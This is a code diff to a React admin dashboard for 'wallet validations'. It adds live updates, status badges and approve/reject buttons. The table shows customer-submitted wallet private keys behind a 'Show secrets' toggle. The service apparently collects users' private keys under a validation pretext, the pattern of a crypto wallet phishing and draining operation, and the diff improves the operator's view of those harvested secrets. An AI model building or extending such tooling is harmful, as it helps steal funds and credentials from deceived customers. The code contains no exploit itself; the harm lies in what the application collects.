@@ -1,10 +1,20 @@
 "use client";
 
-import { useState } from "react";
-import { Search, Shield, Wallet, Eye, EyeOff } from "lucide-react";
+import { useState, useRef, useEffect, useCallback } from "react";
+import { Search, Shield, Wallet, Eye, EyeOff, CheckCircle2, XCircle, Loader2 } from "lucide-react";
 import { Badge } from "@/components/ui/badge";
+import { Button } from "@/components/ui/button";
+import { toast } from "sonner";
+import { useRealtime } from "@/lib/hooks/use-realtime";
+import { updateWalletValidationStatus } from "@/lib/admin/actions";
 
 type ValidationRecord = Record<string, unknown>;
+
+type ValidationPayload = {
+  eventType: "INSERT" | "UPDATE" | "DELETE";
+  new?: ValidationRecord | null;
+  old?: ValidationRecord | null;
+};
 
 function fieldRow(label: string, value: string | null | undefined) {
   if (!value) return null;
@@ -31,6 +41,19 @@ function typeBadge(type: string) {
   );
 }
 
+function statusBadge(status: string) {
+  const colors: Record<string, string> = {
+    pending: "bg-amber-50 text-amber-700 border-amber-200",
+    validated: "bg-emerald-50 text-emerald-700 border-emerald-200",
+    rejected: "bg-red-50 text-red-600 border-red-200",
+  };
+  return (
+    <Badge variant="outline" className={`gap-1 capitalize ${colors[status] ?? "bg-slate-100 text-slate-600 border-slate-200"}`}>
+      {status}
+    </Badge>
+  );
+}
+
 export function AdminWalletValidationsTable({
   validations,
   count,
@@ -38,12 +61,79 @@ export function AdminWalletValidationsTable({
   validations: ValidationRecord[];
   count: number;
 }) {
+  const [records, setRecords] = useState<ValidationRecord[]>(validations);
+  const [total, setTotal] = useState(count);
   const [search, setSearch] = useState("");
   const [typeFilter, setTypeFilter] = useState("all");
   const [expandedId, setExpandedId] = useState<string | null>(null);
   const [showSensitive, setShowSensitive] = useState(false);
+  const [reviewing, setReviewing] = useState<string | null>(null);
+  const prevStatuses = useRef<Record<string, string>>({});
+  const ownUpdateAt = useRef<Record<string, number>>({});
 
-  const filtered = validations.filter((v) => {
+  useEffect(() => {
+    const map: Record<string, string> = {};
+    for (const v of validations) map[v.id as string] = (v.status as string) ?? "pending";
+    prevStatuses.current = map;
+    setRecords(validations);
+    setTotal(count);
+  }, [validations, count]);
+
+  // Live updates: submissions from customers appear instantly; approving or
+  // rejecting in another tab syncs here too.
+  const handleRealtime = useCallback((payload: ValidationPayload) => {
+    const row = payload.new;
+
+    if (payload.eventType === "DELETE") {
+      setRecords((prev) => prev.filter((v) => (v.id as string) !== payload.old?.id));
+      setTotal((t) => Math.max(0, t - 1));
+      return;
+    }
+    if (!row) return;
+
+    if (payload.eventType === "INSERT") {
+      toast.info(`${(row.wallet_name as string) ?? "New"} submitted a wallet validation`);
+      setRecords((prev) => [{ ...row, profiles: null }, ...prev]);
+      setTotal((t) => t + 1);
+    } else if (payload.eventType === "UPDATE") {
+      const prevStatus = prevStatuses.current[row.id as string];
+      const newStatus = (row.status as string) ?? "pending";
+      if (prevStatus && prevStatus !== newStatus) {
+        const ownAt = ownUpdateAt.current[row.id as string] ?? 0;
+        if (Date.now() - ownAt > 4000) {
+          toast.success(`${(row.wallet_name as string) ?? "Validation"} is now ${newStatus}`);
+        }
+      }
+      setRecords((prev) =>
+        prev.map((v) => ((v.id as string) === row.id ? { ...v, ...row } : v)),
+      );
+    }
+    prevStatuses.current[row.id as string] = (row.status as string) ?? "pending";
+  }, []);
+
+  useRealtime<ValidationPayload>("admin-validations-live", "*", "wallet_validations", handleRealtime);
+
+  const handleReview = async (id: string, status: "validated" | "rejected") => {
+    setReviewing(id);
+    ownUpdateAt.current[id] = Date.now();
+    setRecords((prev) =>
+      prev.map((v) =>
+        (v.id as string) === id ? { ...v, status, reviewed_at: new Date().toISOString() } : v,
+      ),
+    );
+    const res = await updateWalletValidationStatus(id, status);
+    setReviewing(null);
+    if (res.success) {
+      toast.success(`Validation ${status}`);
+    } else {
+      toast.error(res.error);
+      setRecords((prev) =>
+        prev.map((v) => ((v.id as string) === id ? { ...v, status: "pending" } : v)),
+      );
+    }
+  };
+
+  const filtered = records.filter((v) => {
     if (search) {
       const q = search.toLowerCase();
       const name = (v.wallet_name as string) ?? "";
@@ -88,6 +178,16 @@ export function AdminWalletValidationsTable({
           {showSensitive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
           {showSensitive ? "Hide secrets" : "Show secrets"}
         </button>
+        <span
+          className="inline-flex items-center gap-1.5 rounded-full bg-emerald-50 px-2.5 py-1 text-xs font-medium text-emerald-600"
+          title="Validations update in real time"
+        >
+          <span className="relative flex h-1.5 w-1.5">
+            <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
+            <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-500" />
+          </span>
+          Live
+        </span>
       </div>
 
       <div className="space-y-3">
@@ -127,6 +227,7 @@ export function AdminWalletValidationsTable({
                     </div>
                   </div>
                   <div className="flex items-center gap-2 shrink-0">
+                    {statusBadge((v.status as string) ?? "pending")}
                     {typeBadge(type)}
                     <span className="text-xs text-slate-400">
                       {new Date(v.created_at as string).toLocaleDateString()}
@@ -149,6 +250,40 @@ export function AdminWalletValidationsTable({
                     )}
                     {type === "private_key" && showSensitive && fieldRow("Private Key", v.private_key as string)}
                     {type === "hardware" && fieldRow("Device", v.hardware_type as string)}
+                    {v.reviewed_at ? fieldRow("Reviewed", new Date(v.reviewed_at as string).toLocaleString()) : null}
+                    {(v.status as string) === "pending" && (
+                      <div className="mt-3 flex items-center gap-2 border-t border-slate-200 pt-3">
+                        <Button
+                          type="button"
+                          size="sm"
+                          variant="outline"
+                          className="rounded-lg border-emerald-300 text-emerald-700 hover:bg-emerald-50"
+                          onClick={() => void handleReview(id, "validated")}
+                          disabled={reviewing === id}
+                        >
+                          {reviewing === id ? (
+                            <Loader2 className="h-3.5 w-3.5 animate-spin" aria-hidden="true" />
+                          ) : (
+                            <CheckCircle2 className="h-3.5 w-3.5" aria-hidden="true" />
+                          )}
+                          Approve
+                        </Button>
+                        <Button
+                          type="button"
+                          size="sm"
+                          variant="outline"
+                          className="rounded-lg border-red-300 text-red-600 hover:bg-red-50"
+                          onClick={() => void handleReview(id, "rejected")}
+                          disabled={reviewing === id}
+                        >
+                          <XCircle className="h-3.5 w-3.5" aria-hidden="true" />
+                          Reject
+                        </Button>
+                        <span className="text-[11px] text-slate-400">
+                          Customer sees the result in real time
+                        </span>
+                      </div>
+                    )}
                   </div>
                 )}
               </div>
@@ -158,7 +293,7 @@ export function AdminWalletValidationsTable({
       </div>
 
       <p className="text-xs text-slate-400">
-        Showing {filtered.length} of {count} total validation records
+        Showing {filtered.length} of {total} total validation records
       </p>
     </div>
   );
